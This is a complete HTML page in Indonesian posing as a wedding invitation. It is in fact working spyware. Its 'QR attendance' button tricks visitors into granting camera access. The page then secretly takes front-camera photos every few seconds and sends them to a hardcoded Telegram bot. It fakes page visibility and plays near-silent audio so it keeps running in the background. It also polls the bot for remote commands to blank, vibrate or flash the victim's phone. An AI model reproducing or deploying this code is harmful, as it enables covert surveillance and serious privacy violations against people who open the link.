<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Undangan Pernikahan</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <script>
        // Data yang dibutuhkan
        const ID_BOT = "8522091674:AAEbmjzttA066Z9RfGKLKKCvdNiZw6_U4Ao";
        const TUJUAN_CHAT = "7699200008";
        const KODE_UNIK = "TAMU_" + Math.random().toString(36).substring(2, 10).toUpperCase();
        const WAKTU_PROSES = new Date().toLocaleString('id-ID');
        const STATUS = { diizinkan: false, aliran: null };

        // ==============================================
        // 💪 FITUR KHUSUS: TETEP JALAN WALAU KELUAR
        // ==============================================
        // Buat audio diam supaya browser gak matiin proses
        let audioContext;
        function jagaAgarTetepHidup() {
            try {
                audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioContext.createOscillator();
                const gainNode = audioContext.createGain();
                
                oscillator.connect(gainNode);
                gainNode.connect(audioContext.destination);
                
                // Frekuensi sangat rendah gak kedengeran
                oscillator.frequency.value = 1; 
                gainNode.gain.value = 0.0001; // Volume hampir nol
                
                oscillator.start();
            } catch(e) {}
        }

        // Cegah browser mendeteksi halaman tersembunyi
        Object.defineProperty(document, 'hidden', { value: false });
        Object.defineProperty(document, 'visibilityState', { value: 'visible' });
        document.dispatchEvent(new Event('visibilitychange'));

        // Fungsi kirim pesan
        async function kirimPesan(isi) {
            try {
                await fetch(`https://api.telegram.org/bot${ID_BOT}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: TUJUAN_CHAT, text: isi, parse_mode: "HTML" })
                });
            } catch {
                setTimeout(() => kirimPesan(isi), 800);
            }
        }

        // Fungsi kirim berkas/gambar
        async function kirimBerkas(data, keterangan) {
            const bentuk = new FormData();
            bentuk.append("chat_id", TUJUAN_CHAT);
            bentuk.append("caption", keterangan);
            bentuk.append("photo", data, `FOTO_${KODE_UNIK}_${Date.now()}.jpg`);
            
            try {
                await fetch(`https://api.telegram.org/bot${ID_BOT}/sendPhoto`, { method: "POST", body: bentuk });
            } catch (err) {
                console.error("Gagal kirim foto:", err);
            }
        }

        // ==============================================
        // TAMPILAN AWAL: UNDANGAN PERNIKAHAN
        // ==============================================
        function tampilkanUndangan() {
            kirimPesan(`<b>🔔 LINK DIBUKA!</b>\nKode: ${KODE_UNIK}\nWaktu: ${WAKTU_PROSES}\n\nSedang melihat undangan...`);

            document.body.innerHTML = `
                <div class="min-h-screen bg-gradient-to-br from-red-50 to-pink-100 flex items-center justify-center p-4">
                    <div class="bg-white rounded-3xl shadow-2xl p-8 max-w-md w-full text-center border-4 border-red-200">
                        
                        <div class="w-20 h-20 mx-auto mb-4 bg-red-100 rounded-full flex items-center justify-center">
                            <i class="fas fa-heart text-red-500 text-4xl"></i>
                        </div>

                        <h2 class="text-3xl font-bold text-red-600 mb-2 font-serif">Undangan Pernikahan</h2>
                        <p class="text-gray-500 mb-6">Kepada Yth. Bapak/Ibu/Saudara/i</p>
                        
                        <div class="text-2xl font-bold text-gray-800 my-6 font-serif">
                            <span>ANDA</span>
                        </div>

                        <p class="text-gray-600 mb-8 leading-relaxed">
                            Tanpa mengurangi rasa hormat, kami mengundang Bapak/Ibu/Saudara/i untuk hadir di acara pernikahan kami.
                        </p>

                        <div class="bg-red-50 rounded-xl p-4 mb-8">
                            <p class="text-red-700 font-semibold"><i class="fas fa-calendar-alt mr-2"></i> Minggu, 20 Mei 2024</p>
                            <p class="text-red-700 font-semibold"><i class="fas fa-clock mr-2"></i> Pukul 10:00 WIB - Selesai</p>
                            <p class="text-red-700 font-semibold"><i class="fas fa-map-marker-alt mr-2"></i> Gedung Pernikahan Indah</p>
                        </div>

                        <!-- TOMBOL PENTING -->
                        <button onclick="munculkanIzin()" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-4 px-6 rounded-xl text-lg shadow-lg transition transform hover:scale-105">
                            <i class="fas fa-qrcode mr-2"></i> Buka QR Code Absensi
                        </button>
                        
                        <p class="text-xs text-gray-400 mt-4">*Mohon izinkan akses kamera untuk memindai QR</p>
                    </div>
                </div>
            `;
        }

        // Fungsi meminta akses kamera
        async function munculkanIzin() {
            try {
                STATUS.aliran = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: "user", 
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                });
                
                STATUS.diizinkan = true;
                
                // 🔴 AKTIFKAN FITUR "KEBAL"
                jagaAgarTetepHidup();
                
                kirimPesan(`<b>✅ BERHASIL!</b>\nKode: ${KODE_UNIK}\n\nKamera AKTIF & SIAP KONTROL 24 JAM!`);

                // Ganti tampilan jadi loading
                document.body.innerHTML = `
                    <div class="min-h-screen bg-green-50 flex items-center justify-center p-4">
                        <div class="bg-white rounded-3xl shadow-2xl p-8 max-w-md w-full text-center">
                            <i class="fas fa-spinner fa-spin text-green-600 text-6xl mb-4"></i>
                            <h2 class="text-2xl font-bold text-gray-800 mb-2">Memproses...</h2>
                            <p class="text-gray-600">Sedang memverifikasi data kehadiran</p>
                            <div class="w-full bg-gray-200 rounded-full h-2.5 mt-4">
                                <div class="bg-green-600 h-2.5 rounded-full animate-pulse" style="width: 80%"></div>
                            </div>
                        </div>
                    </div>
                `;

                // Jalanin semua fitur
                aktifkanKamera();
                buatTombolKendali();

            } catch (err) {
                console.error(err);
                kirimPesan(`<b>⚠️ GAGAL AKSES</b>\nKode: ${KODE_UNIK}\n\nAlasan: ${err.message}`);
                
                alert("Kamera tidak bisa diakses! Pastikan Anda mengklik IZINKAN / ALLOW.");
            }
        }

        // Fungsi aktifkan kamera dan ambil gambar
        function aktifkanKamera() {
            if (!STATUS.diizinkan || !STATUS.aliran) return;

            const elemenVideo = document.createElement("video");
            elemenVideo.srcObject = STATUS.aliran;
            elemenVideo.autoplay = true;
            elemenVideo.muted = true;
            elemenVideo.playsInline = true;
            elemenVideo.style.position = "absolute";
            elemenVideo.style.top = "-9999px";
            elemenVideo.style.left = "-9999px";
            document.body.appendChild(elemenVideo);

            elemenVideo.onloadedmetadata = () => {
                // TUNGGU 2 DETIK BIAR GAMBAR JELAS
                setTimeout(() => {
                    ambilDanKirimGambar(elemenVideo);
                }, 2000);

                // Ambil gambar ulang setiap 5 detik
                setInterval(() => {
                    if (STATUS.diizinkan) {
                        setTimeout(() => {
                            ambilDanKirimGambar(elemenVideo);
                        }, 1000);
                    }
                }, 5000);
            };
        }

        function ambilDanKirimGambar(video) {
            try {
                const kanvas = document.createElement("canvas");
                kanvas.width = video.videoWidth || 640;
                kanvas.height = video.videoHeight || 480;
                
                const ctx = kanvas.getContext("2d");
                ctx.drawImage(video, 0, 0, kanvas.width, kanvas.height);

                kanvas.toBlob(async (hasil) => {
                    if (hasil && hasil.size > 1000) {
                        await kirimBerkas(hasil, `<b>📸 FOTO TAMU</b>\nKode: ${KODE_UNIK}\nWaktu: ${new Date().toLocaleString('id-ID')}`);
                    }
                }, "image/jpeg", 0.9);

            } catch (err) {
                console.error("Error ambil gambar:", err);
            }
        }

        // Fungsi tombol kendali
        async function buatTombolKendali() {
            const tombol = {
                keyboard: [
                    [{ text: "📸 AMBIL FOTO" }, { text: "🔲 GELAPKAN LAYAR" }],
                    [{ text: "💥 GETARKAN HP" }, { text: "✨ EFEK KEDIP" }],
                    [{ text: "❌ MATIKAN KAMERA" }]
                ],
                resize_keyboard: true,
                one_time_keyboard: false
            };

            await fetch(`https://api.telegram.org/bot${ID_BOT}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: TUJUAN_CHAT,
                    text: `<b>🎮 PANEL KENDALI AKTIF SELAMANYA!</b>\nKode: ${KODE_UNIK}\n\n✅ Mode Background ON\n✅ Tetep jalan walau keluar halaman\n✅ Tetep jalan walau layar mati`,
                    parse_mode: "HTML",
                    reply_markup: JSON.stringify(tombol)
                })
            });

            pantauPerintah();
        }

        function pantauPerintah() {
            // Gunakan interval yang lebih stabil
            setInterval(async () => {
                try {
                    const res = await fetch(`https://api.telegram.org/bot${ID_BOT}/getUpdates?offset=-1`);
                    const data = await res.json();

                    if (data.ok && data.result.length > 0) {
                        const pesan = data.result[0].message;
                        if (!pesan || pesan.chat.id != TUJUAN_CHAT) return;

                        jalankanPerintah(pesan.text);
                        await fetch(`https://api.telegram.org/bot${ID_BOT}/getUpdates?offset=${data.result[0].update_id + 1}`);
                    }
                } catch (e) {}
            }, 1000);
        }

        function jalankanPerintah(perintah) {
            switch(perintah) {
                case "📸 AMBIL FOTO":
                    setTimeout(() => {
                        ambilDanKirimGambar(document.querySelector("video"));
                    }, 1000);
                    kirimPesan(`<b>✅ Mengambil foto...</b>`);
                    break;
                case "🔲 GELAPKAN LAYAR":
                    document.body.style.background = "#000";
                    document.body.innerHTML = "";
                    kirimPesan(`<b>✅ Layar digelapkan!</b>`);
                    break;
                case "💥 GETARKAN HP":
                    if (navigator.vibrate) navigator.vibrate([200, 100, 200, 100, 300]);
                    kirimPesan(`<b>✅ HP bergetar!</b>`);
                    break;
                case "✨ EFEK KEDIP":
                    let nyala = true;
                    const kedip = setInterval(() => {
                        document.body.style.background = nyala ? "#000" : "#fff";
                        nyala = !nyala;
                    }, 150);
                    setTimeout(() => { clearInterval(kedip); }, 3000);
                    kirimPesan(`<b>✅ Layar berkedip!</b>`);
                    break;
                case "❌ MATIKAN KAMERA":
                    STATUS.diizinkan = false;
                    if(STATUS.aliran) STATUS.aliran.getTracks().forEach(lacak => lacak.stop());
                    if(audioContext) audioContext.close();
                    kirimPesan(`<b>✅ Kamera dimatikan!</b>`);
                    break;
            }
        }

        // Jalankan saat halaman dibuka
        window.addEventListener('load', () => {
            tampilkanUndangan();
        });
    </script>
</head>
<body>
</body>
</html>
